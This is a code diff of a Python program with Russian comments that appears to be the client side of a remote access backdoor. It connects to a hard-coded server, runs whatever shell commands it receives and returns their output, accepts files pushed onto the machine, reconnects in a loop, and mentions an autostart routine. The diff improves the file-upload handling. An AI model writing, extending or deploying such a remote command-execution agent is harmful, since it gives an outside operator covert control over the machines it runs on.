@@ -8,16 +8,17 @@ SERVER_IP = "192.168.100.3"  # Установите ваш IP сервера
 SERVER_PORT = 5000
 BUFFER_SIZE = 4096
 
+
 def execute_command(command):
     try:
         return subprocess.getoutput(command)
     except Exception as e:
         return f"Ошибка выполнения команды: {e}"
 
+
 def is_windows():
     return os.name == 'nt'
 
-# ... (автозагрузка и другие функции остались без изменений) ...
 
 def main():
     try:
@@ -161,15 +162,28 @@ def main():
                 elif command.startswith("upload:"):
                     filepath = command[len("upload:"):].strip()
                     try:
+                        # Принимаем 8 байт размера файла
+                        filesize_bytes = s.recv(8)
+                        if len(filesize_bytes) < 8:
+                            s.send("Ошибка: не удалось получить размер файла".encode())
+                            continue
+                        filesize = int.from_bytes(filesize_bytes, byteorder='big')
+
                         with open(filepath, "wb") as f:
-                            while True:
-                                chunk = s.recv(BUFFER_SIZE)
-                                if chunk == b"__file_transfer_end__" or not chunk:
+                            received = 0
+                            while received < filesize:
+                                chunk = s.recv(min(BUFFER_SIZE, filesize - received))
+                                if not chunk:
                                     break
                                 f.write(chunk)
-                        # Отправляем подтверждение успешного получения файла
-                        s.send(f"Файл {os.path.basename(filepath)} успешно получен.\n".encode())
-                        print(f"[INFO] Файл {filepath} успешно сохранён")
+                                received += len(chunk)
+
+                        if received == filesize:
+                            s.send(f"Файл {os.path.basename(filepath)} успешно получен.\n".encode())
+                            print(f"[INFO] Файл {filepath} успешно сохранён")
+                        else:
+                            s.send(f"Ошибка: получено {received} байт, ожидалось {filesize}".encode())
+
                     except Exception as e:
                         s.send(f"Ошибка при сохранении файла: {e}".encode())
                         print(f"[ERROR] Ошибка при сохранении файла: {e}")
@@ -191,6 +205,7 @@ def main():
             s.close()
 
         time.sleep(5)
+
 
 if __name__ == "__main__":
     main()
